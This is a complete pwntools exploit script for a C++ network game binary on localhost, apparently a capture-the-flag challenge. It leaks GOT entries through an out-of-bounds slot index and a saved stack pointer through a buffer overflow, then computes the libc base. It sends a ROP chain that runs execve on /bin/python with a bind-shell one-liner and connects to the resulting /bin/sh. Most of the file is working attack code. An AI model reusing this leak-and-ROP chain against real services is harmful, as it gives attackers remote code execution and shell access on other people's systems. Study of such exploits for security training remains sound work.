#!/usr/bin/env python3
from pwn import *

log = success # alias
bin_fname = "./build/game"
libc_fname = "./build/libc.so.6"
context.binary = bin_fname

"""
C++ this pointer is first argument in SystemV ABI

Disassemble program using
objdump -Cd -M intel --visualize-jumps=extended-color --no-show-raw-insn [prog]

Look at specific functions of interest
grep '<bid(sock\*, Player<5>\*)>:' -A 113
grep '<bidContinue(sock\*, Player<5>\*)>:' -A 94
grep '<gameloop()>:' -A 392
"""

io = None
def reconnect():
    global io
    if io is not None:
        io.close()
    io = remote("localhost", 25565)

# Buffer Overflow - Shellcode injection
# bidContinue (BoF) local variables:
# *s @ [rbp-0x58], *user @ [rbp-0x60]
# success @ [rbp-0x11]
# slotBids @ [rbp-0x18], oldBal @ [rbp-0x1c], newBal @ [rbp-0x20]
# response[3] @ [rbp-0x23]
def bid(slot: int, amount: int, query: list[int] = []) -> list[int]:
    prize = []  # type: list[int]
    for i in query:
        io.recvuntil(b"Slot?\n")
        io.sendline(str(i).encode())
        val = io.recvline(False).split(b":", 1)[1].decode()
        prize.append(int(val))
    io.sendlineafter(b"Slot?\n", b"Done")

    io.recvuntil(b"Slot:\n")
    io.sendline(str(slot).encode())
    io.recvuntil(b"Gems:\n")
    io.sendline(str(amount).encode())

    return prize


def bidContinue(response: bytes = b"Y") -> tuple[list[bytes], bytes]:
    user_data = [io.recvline(False) for _ in range(3)]
    io.sendline(response)

    err_data = b"" if response[0] in b"YyNn" else io.recvuntil(b"'\n")

    return user_data, err_data

#
# Start exploit
#

# Prepare to leak LIBC via GOT (use 2 addr to verify version)

bin_elf = ELF(bin_fname)
addr_slotBids = [v for k,v in bin_elf.sym.items() if "slotBids" in k][0]    # Find address with C++ name mangling
got_puts = bin_elf.got["puts"]      # Be sure to choose functions which have been
got_printf = bin_elf.got["printf"]  # called at least once before program calls bid()

offsets = [x - addr_slotBids + i for x in (got_puts, got_printf) for i in (0, 4)]   # Get 64 bit integer by 2 x 32 bit integer leaks
querys = [x // 4 for x in offsets ]  # Int array indexing by 4 bytes

log(f" slotBids  @ 0x{addr_slotBids:02x}")
log(f"got  puts  @ 0x{got_puts:02x}")
log(f"got printf @ 0x{got_printf:02x}")
log(f"offsets = {offsets}")
log(f"offsets = {querys}")

assert all(q * 4 == o for q, o in zip(querys, offsets))  # Sanity check

# Leak LIBC offsets + stack base pointer
query_res = []  # Store memory data
rbp = 0         # Update this value with leaked stack address
for i, q in enumerate(querys):
    log("=====")
    reconnect()
    bid(q, 0)
    responses = bidContinue(b"N") if i > 0 else bidContinue(b"\x01" * 0x22)

    log(f"user data = {responses[0]}")
    log(f"error res = {responses[1]}")

    # Collect LIBC leaks
    leak_val = int(responses[0][0].split(b":", maxsplit=1)[1].decode())
    leak_data = leak_val.to_bytes(4, 'little', signed=True) # Cannot use p32() since signed

    log(f"leak val  = {leak_val}")
    log(f"leak data = {leak_data}")

    query_res.append(leak_data)

    if i == 0:  # First iteration leaks base pointer via BoF (see BoF + shellcode version)
        rbp_raw = responses[1].split(b"\n", 1)[1].rsplit(b"'")[0]
        rbp = u64(rbp_raw.ljust(8, b"\x00"))

        log(f"rbp raw = {rbp_raw}")
        log(f"rbp val = 0x{rbp:02x}")

        assert len(rbp_raw) >= 6    # Expected rbp size

log("=====")

log(f"query_res = {query_res}")

addr_puts = u64(query_res[0] + query_res[1])
addr_printf = u64(query_res[2] + query_res[3])

log(f" puts  @ 0x{addr_puts:02x}")
log(f"printf @ 0x{addr_printf:02x}")

bin_libc = ELF(libc_fname)
bin_libc.address = addr_puts - bin_libc.sym["puts"]

log(f" libc  @ 0x{bin_libc.address:02x}")

# Reconnect and skip a round
# For some reason, same stack is used every second time (usually)
if len(querys) % 2 == 1:
    reconnect()
    bid(0, 1)
    bidContinue(b"N")
    log(f"Blank run to even out")

# Assert successful leak
assert rbp > 0
assert len(query_res) == len(querys)

log("=====")

# Calculate frame base from leaked rbp (this points to previous frame)
# Since bidContinue is called from std::async(), use offset found via gdb
# Returns to this C++ internal function
#   template<typename _Res, typename _Fn, typename... _Args>
#   constexpr _Res __invoke_impl(__invoke_other, _Fn&& __f, _Args&&... __args)
# which reserves 0x30 stack space
frame = rbp - 0x40              # 0x20 from previous frame + 8 for rbp + 8 for ret addr
log(f"frame = 0x{frame:02x}")   # value of rbp
log(f" rbp  = 0x{rbp:02x}")     # value of saved base pointer (reprint for debugging)

# Generate ROP chain to launch a python bind shell via linux syscall
# execve("/bin/python", *char[]{"-c", "...", NULL}, NULL)
# Reference: https://blog.atucom.net/2017/06/smallest-python-bind-shell.html
BIND_PORT = 25566
BIND_SHELL = [
    f"import socket as s;a=s.socket();a.bind(('127.1',{BIND_PORT}));a.listen(1);r,z=a.accept();exec(r.recv(99))",
    "import subprocess as p;p.run('/bin/sh',stdin=r,stdout=r,stderr=r);a.close()"
]
ropchain = ROP([bin_elf, bin_libc], badchars=b"\n")
ropchain.raw(b"A" * 0x23)       # BoF
ropchain.raw(rbp)               # Preserve stack base pointer <-- {frame}

ropchain.raw(ropchain.rdi)      # pop rdi ; ret
ropchain.raw(frame + 0x78)      # pointer to argv[0]

ropchain.raw(ropchain.rsi)      # pop rsi ; ret
ropchain.raw(frame + 0x58)      # pointer to argv == &argv[0]

ropchain.raw(ropchain.rdx)      # pop rdx ; pop r12 (or rbx) ; ret
ropchain.raw(0)
ropchain.raw(0)

ropchain.raw(ropchain.rax)      # pop rax ; ret
ropchain.raw(59)                # syscall number for execve

ropchain.raw(ropchain.find_gadget(["syscall"]))  # call execve syscall
# There is a mov eax, 59 ; syscall gadget but pwntools is unable to find it
# hence the reason for 2 separate gadgets

ropchain.raw(frame + 0x78)      # &argv[0]  @ frame + 0x58
ropchain.raw(frame + 0x84)      # &argv[1]  @ frame + 0x60
ropchain.raw(frame + 0x87)      # &argv[2]  @ frame + 0x68
ropchain.raw(0)                 # array must end with NULL

ropchain.raw(b"/bin/python\x00")                # argv[0]   @ frame + 0x78 (12 bytes)
ropchain.raw(b"-c\x00")                         # argv[1]   @ frame + 0x84 (3 bytes)
ropchain.raw(BIND_SHELL[0].encode() + b"\x00")  # argv[2]   @ frame + 0x87 (many bytes)

print(ropchain.dump())
payload = ropchain.chain()

reconnect()
bid(0, 1)      # Only to advance to next prompt
bidContinue(payload)

# Connect to the bind shell
io.close()
pause(3)    # Wait for bind shell to start up
io = remote("localhost", BIND_PORT)
io.sendline(BIND_SHELL[1].encode())

io.interactive()
